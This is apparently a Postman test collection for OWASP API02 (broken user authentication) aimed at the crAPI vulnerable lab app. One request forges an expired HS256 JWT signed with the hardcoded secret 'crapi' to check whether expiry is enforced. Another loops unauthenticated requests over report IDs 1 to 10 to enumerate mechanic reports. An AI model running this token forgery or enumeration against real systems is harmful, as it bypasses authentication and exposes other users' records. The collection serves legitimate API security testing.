{
	"info": {
		"_postman_id": "62726f08-d7e7-4bc5-9d2f-921acbb219bf",
		"name": "API02:2019 Broken User Authentication",
		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
		"_exporter_id": "20999705"
	},
	"item": [
		{
			"name": "Broken Verification of Expired JWT Token",
			"event": [
				{
					"listen": "prerequest",
					"script": {
						"exec": [
							"function base64url(source) {",
							"\t// Encode in classical base64",
							"\tencodedSource = CryptoJS.enc.Base64.stringify(source);",
							"",
							"\t// Remove padding equal characters",
							"\tencodedSource = encodedSource.replace(/=+$/, '');",
							"",
							"\t// Replace characters according to base64url specifications",
							"\tencodedSource = encodedSource.replace(/\\+/g, '-');",
							"\tencodedSource = encodedSource.replace(/\\//g, '_');",
							"",
							"\treturn encodedSource;",
							"}",
							"",
							"function addIAT(request) {",
							"\tvar iat = Math.floor(Date.now() / 1000) - 4600;",
							"\trequest.iat = iat;",
							"\treturn request;",
							"}",
							"",
							"function addEXP(request) {",
							"    var exp = Math.floor(Date.now() / 1000) - 1000;",
							"    request.exp = exp;",
							"    return request",
							"}",
							"",
							"",
							"var header = {",
							"\t\"typ\": \"JWT\",",
							"\t\"alg\": \"HS256\"",
							"};",
							"",
							"var data = {",
							"\t\"sub\": \"mike@fake.com\"",
							"};",
							"",
							"data = addIAT(data);",
							"data = addEXP(data);",
							"",
							"var secret = 'crapi';",
							"",
							"// encode header",
							"var stringifiedHeader = CryptoJS.enc.Utf8.parse(JSON.stringify(header));",
							"var encodedHeader = base64url(stringifiedHeader);",
							"",
							"// encode data",
							"var stringifiedData = CryptoJS.enc.Utf8.parse(JSON.stringify(data));",
							"var encodedData = base64url(stringifiedData);",
							"",
							"// build token",
							"var token = encodedHeader + \".\" + encodedData;",
							"",
							"// sign token",
							"var signature = CryptoJS.HmacSHA256(token, secret);",
							"signature = base64url(signature);",
							"var signedToken = token + \".\" + signature;",
							"console.log(signedToken)",
							"pm.globals.set('badToken', signedToken)"
						],
						"type": "text/javascript"
					}
				}
			],
			"request": {
				"auth": {
					"type": "bearer",
					"bearer": [
						{
							"key": "token",
							"value": "{{badToken}}",
							"type": "string"
						}
					]
				},
				"method": "GET",
				"header": [],
				"url": {
					"raw": "{{crapi-web}}/workshop/api/mechanic/mechanic_report?report_id={{report_id}}",
					"host": [
						"{{crapi-web}}"
					],
					"path": [
						"workshop",
						"api",
						"mechanic",
						"mechanic_report"
					],
					"query": [
						{
							"key": "report_id",
							"value": "{{report_id}}"
						}
					]
				}
			},
			"response": []
		},
		{
			"name": "Broken Authentication",
			"event": [
				{
					"listen": "prerequest",
					"script": {
						"exec": [
							"if (!pm.globals.has('report_id')) ",
							"    pm.globals.set('report_id', 1)"
						],
						"type": "text/javascript"
					}
				},
				{
					"listen": "test",
					"script": {
						"exec": [
							"let report_id = pm.globals.get('report_id')",
							"if (report_id < 10) {",
							"    pm.globals.set('report_id', report_id + 1)",
							"    postman.setNextRequest(pm.info.requestName)",
							"} else {",
							"    pm.globals.set('report_id', 1)",
							"}"
						],
						"type": "text/javascript"
					}
				}
			],
			"request": {
				"auth": {
					"type": "noauth"
				},
				"method": "GET",
				"header": [],
				"url": {
					"raw": "{{crapi-web}}/workshop/api/mechanic/mechanic_report?report_id={{report_id}}",
					"host": [
						"{{crapi-web}}"
					],
					"path": [
						"workshop",
						"api",
						"mechanic",
						"mechanic_report"
					],
					"query": [
						{
							"key": "report_id",
							"value": "{{report_id}}"
						}
					]
				}
			},
			"response": []
		}
	]
}